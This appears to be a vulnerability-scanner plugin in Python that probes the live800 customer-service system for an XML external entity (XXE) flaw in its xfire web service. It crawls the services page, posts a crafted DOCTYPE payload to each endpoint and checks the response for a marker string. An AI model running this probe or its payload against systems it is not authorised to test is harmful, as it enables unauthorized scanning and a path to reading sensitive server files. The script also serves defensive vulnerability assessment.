#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: live800在线客服系统XML实体注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0167079
author: Lucifer
description: live800使用了xfire实现webservice,xfire存在一个XXE，可以直接利用获取远程敏感文件信息。
'''
import sys
import json
import requests
import warnings


from bs4 import BeautifulSoup

class services_xxe():
    def __init__(self, url):
        self.url = url

    def catch_service(self):
        servlist = []
        vulnurl = self.url + "/live800/services"
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)
            soup = BeautifulSoup(req.text, "html.parser")
            html = soup.find_all("a")
            if len(html) != 0:
                for servurl in html:
                    servlist.append(servurl["href"].strip("?wsdl"))
            else:
                 servlist.append("https://www.baidu.com")
            return servlist

        except:
            pass


    def run(self):
        result = ['live800在线客服系统XML实体注入漏洞', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "SOAPAction":"",
            "Content-Type":"text/xml"
        }
        post_data = '''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "81dc9bdb52d04dc20036dbd8313ed055">%remote;]>'''
        vulnurls = self.catch_service()
        try:
            noexist = True
            for vulnurl in vulnurls:
                req = requests.post(vulnurl, headers=headers, data=post_data, timeout=10, verify=False)
                if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                    result[2]=  '存在'
                    result[1] = vulnurl+"\npost: "+json.dumps(post_data, indent=4)
                    noexist = False
            if noexist:
                result[2]=  '不存在'
        except:
            result[2]='未知'
        return result


if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = services_xxe(sys.argv[1])
    testVuln.run()
